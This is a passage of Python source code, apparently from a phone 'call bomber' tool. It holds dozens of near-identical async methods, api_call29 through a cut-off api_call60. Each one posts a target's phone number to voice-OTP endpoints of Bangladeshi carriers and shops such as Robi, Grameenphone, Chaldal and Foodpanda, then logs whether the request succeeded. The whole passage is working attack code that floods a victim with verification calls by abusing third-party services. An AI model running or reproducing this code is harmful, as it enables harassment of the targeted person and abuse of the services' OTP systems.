            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL28 - Extra API 28", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL28 - Extra API 28", False, "Error")
            return False

    async def api_call29___extra_call_api_29(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[29 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL29 - Extra API 29", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL29 - Extra API 29", False, "Error")
            return False

    async def api_call30___extra_call_api_30(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[30 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL30 - Extra API 30", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL30 - Extra API 30", False, "Error")
            return False

    async def api_call31___extra_call_api_31(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[31 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL31 - Extra API 31", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL31 - Extra API 31", False, "Error")
            return False

    async def api_call32___extra_call_api_32(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[32 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL32 - Extra API 32", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL32 - Extra API 32", False, "Error")
            return False

    async def api_call33___extra_call_api_33(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[33 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL33 - Extra API 33", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL33 - Extra API 33", False, "Error")
            return False

    async def api_call34___extra_call_api_34(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[34 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL34 - Extra API 34", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL34 - Extra API 34", False, "Error")
            return False

    async def api_call35___extra_call_api_35(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[35 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL35 - Extra API 35", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL35 - Extra API 35", False, "Error")
            return False

    async def api_call36___extra_call_api_36(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[36 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL36 - Extra API 36", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL36 - Extra API 36", False, "Error")
            return False

    async def api_call37___extra_call_api_37(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[37 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL37 - Extra API 37", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL37 - Extra API 37", False, "Error")
            return False

    async def api_call38___extra_call_api_38(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[38 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL38 - Extra API 38", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL38 - Extra API 38", False, "Error")
            return False

    async def api_call39___extra_call_api_39(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[39 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL39 - Extra API 39", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL39 - Extra API 39", False, "Error")
            return False

    async def api_call40___extra_call_api_40(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[40 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL40 - Extra API 40", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL40 - Extra API 40", False, "Error")
            return False

    async def api_call41___extra_call_api_41(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[41 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL41 - Extra API 41", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL41 - Extra API 41", False, "Error")
            return False

    async def api_call42___extra_call_api_42(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[42 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL42 - Extra API 42", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL42 - Extra API 42", False, "Error")
            return False

    async def api_call43___extra_call_api_43(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[43 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL43 - Extra API 43", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL43 - Extra API 43", False, "Error")
            return False

    async def api_call44___extra_call_api_44(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[44 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL44 - Extra API 44", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL44 - Extra API 44", False, "Error")
            return False

    async def api_call45___extra_call_api_45(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[45 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL45 - Extra API 45", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL45 - Extra API 45", False, "Error")
            return False

    async def api_call46___extra_call_api_46(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[46 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL46 - Extra API 46", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL46 - Extra API 46", False, "Error")
            return False

    async def api_call47___extra_call_api_47(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[47 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL47 - Extra API 47", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL47 - Extra API 47", False, "Error")
            return False

    async def api_call48___extra_call_api_48(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[48 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL48 - Extra API 48", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL48 - Extra API 48", False, "Error")
            return False

    async def api_call49___extra_call_api_49(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[49 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL49 - Extra API 49", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL49 - Extra API 49", False, "Error")
            return False

    async def api_call50___extra_call_api_50(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[50 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL50 - Extra API 50", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL50 - Extra API 50", False, "Error")
            return False

    async def api_call51___extra_call_api_51(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[51 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL51 - Extra API 51", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL51 - Extra API 51", False, "Error")
            return False

    async def api_call52___extra_call_api_52(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[52 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL52 - Extra API 52", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL52 - Extra API 52", False, "Error")
            return False

    async def api_call53___extra_call_api_53(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[53 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL53 - Extra API 53", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL53 - Extra API 53", False, "Error")
            return False

    async def api_call54___extra_call_api_54(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[54 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL54 - Extra API 54", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL54 - Extra API 54", False, "Error")
            return False

    async def api_call55___extra_call_api_55(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[55 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL55 - Extra API 55", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL55 - Extra API 55", False, "Error")
            return False

    async def api_call56___extra_call_api_56(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[56 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL56 - Extra API 56", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL56 - Extra API 56", False, "Error")
            return False

    async def api_call57___extra_call_api_57(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[57 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL57 - Extra API 57", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL57 - Extra API 57", False, "Error")
            return False

    async def api_call58___extra_call_api_58(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[58 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL58 - Extra API 58", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL58 - Extra API 58", False, "Error")
            return False

    async def api_call59___extra_call_api_59(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[59 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL59 - Extra API 59", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL59 - Extra API 59", False, "Error")
            return False

    async def api_call60___extra_call_api_60(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
